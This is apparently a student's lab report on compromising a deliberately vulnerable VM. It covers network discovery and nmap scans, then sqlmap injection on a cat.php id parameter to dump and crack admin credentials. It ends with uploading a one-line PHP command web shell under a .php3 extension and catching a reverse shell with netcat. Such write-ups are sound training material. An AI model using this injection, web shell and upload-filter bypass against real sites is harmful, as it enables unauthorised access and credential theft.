# Report Labs / Flavio POGGIOLI

## Table of contents

  - [Report Labs / Flavio POGGIOLI](#report-labs--flavio-poggioli)
  - [Table of contents](#table-of-contents)

## VM n°80

Targets : Reconnaissance, SQLi, exploit

### 1. Find IP address of the machine

```bash
$ sudo netdiscover -r 10.0.2.0/24
```
Our target is 10.0.2.7.

![picture 0](../images/bc267a05816217fe9b235aee12329d24e270323656f60c62493a043ec341ac5b.png)  

### 2. List all open ports

We need to determine the open ports and the services running on them using nmap with some options (uniquly ports and secondly enabling default scripts, identifying service versions, and disregarding ping host discovery.).

```bash
$ sudo nmap -p- 10.0.2.7
$ sudo nmap -sC -sV -Pn 10.0.2.7
```

![picture 1](../images/607138fad172eadf3a73f784ef9cc3a676c7396de49dc670a7fe344a4e020a62.png)  

![picture 2](../images/c52eca9bd070e0535951de0033fd4697d84dd9fd1e515819d46c6754c8a6c353.png)  

Now we can see that theses ports are open (all TCP) :
- port 22 — OpenSSH 5.5p1 Debian 6+squeeze2 (protocol 2.0)
- port 80 - Apache httpd 2.2.16 ((Debian))

### 3. Find vulnerabilities

#### 3.1. Port 80 - HTTP

We can try to find vulnerabilities on the web server with dirb.

```bash
$ dirb http://10.0.2.7
```

![picture 3](../images/713a5a869f2cade655cf27fd58af3a883ce84c2acf608e70a1b9fa2edbb4e910.png)  

After opened the main page of the web server, we can see a secret blog, with some pages, pictures and tabs.

![picture 4](../images/d5099a854fc1bd8562f6604cb17c91ef46347c57ad334ee9b02f1297cb3e2bde.png)  

Admin page is protected by a password.

![picture 5](../images/b06b69579beb80a882996b60b8acd3fc07380d9e27597ec0d2d5bdc7cb8b7238.png)  


### 4. Exploit with sqlmap

Now that we have found a web server, we can try to exploit it with sqlmap (-u to state the vulnerable URL and --dbs to enumerate the database).

```bash
$ sqlmap -u http://10.0.2.7/ --dbs
```

![picture 6](../images/8576425f4d707040c1968867a5398bfa97e8626cdf43c8b942835b23dfbd21f7.png)  

I have failed to do the sqlmap because sqlmap need parameter(s) for testing in the provided data.
So, we need to choose one page with a parameter to test in the URL, so we can try to exploit cat.php and some id parameter.

```bash
$ sqlmap -u http://10.0.2.7/cat.php?id= --dbs
```
![picture 7](../images/20351d6f039bcd8fb0887154d92235511886624aa23ebc43a5637014acc1bacc.png)  

We can see that 2 databases are hosted, `information_schema` and `photoblog`.

Now, we can specify the database to enumerate tables.

```bash
sqlmap -u http://10.0.2.7/cat.php?id= --tables -D photoblog
```

![picture 8](../images/f2ee0d47628ce8221b66dea9a65555d6caed64a387a19ebdf3b9b26ae5b1082a.png)  


We can see that 3 tables are in database `photoblog` --> `users`, `categories` and `pictures`.

Now, we can specify the database and the table to enumerate and dump columns.

```bash
sqlmap -u http://10.0.2.7/cat.php?id= --columns -D photoblog -T users
```
![picture 9](../images/c6a72f691b8fcc3c43d810ce39fbbea5f6b56731b79d4fb8671054ee72f9a449.png) 

We can see that 3 columns are in table `users` --> `id`, `login` and `password`.

To dump the password, we can proceed with the same command and add `--dump` option.

```bash
sqlmap -u http://10.0.2.7/cat.php?id= --dump -D photoblog -T users
```
![picture 10](../images/3d053e5ef742b37342f8067a36aa96be17c20e607245936ff39777d1ade497b3.png)  

The program ask us if i want to crack the hash of the passwords founds, and after that, the password are cracked.

`admin:P4ssw0rd` (hash:8efe310f9ab3efeae8d410a8e0166eb2)

Now, we can try to connect to the admin page with the credentials found.

A new page is displayed, with a new tab, `Upload`.

![picture 11](../images/6470a6c90ade0cd237eb9d0323e8d839c053f48fe6f9fc6efc8177483281cba2.png)  

We can try to upload a file to get a reverse shell, but the file is rejected because the file is not an image.

I tried to put that in a file and upload it with the name `script.php3`.
```php
<?php
  system($_GET['cmd']);
?>
```
Now we can go to `10.0.2.7/admin/uploads` which is a directory listable, and we can see our file.
I click on it and i put a parameter `?cmd=whoami` and i wan see that our user is www-data.

![picture 0](../images/60bcd3b6359408132253728be3fdb92b687dbce32f6acce597c9958b94ab3ab3.png)  

## Another method

With this script
[Github source of php reverse shell script](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
we can upload like the old script (rename it with .Php or php3 extension), upload it and execute it with the same method.

Just insure that the IP address and the port are correct in the port (the kali machine and a random port 8080 for me)


![picture 0](../images/51a333d98ef4de92a2c42585298ed0b9a896ae16fe0cc9b76cdb3317536e196a.png)  


We can listen with `nc -v -n -l -p 8080`

With that, we can access to a reverse shell with the user www-data.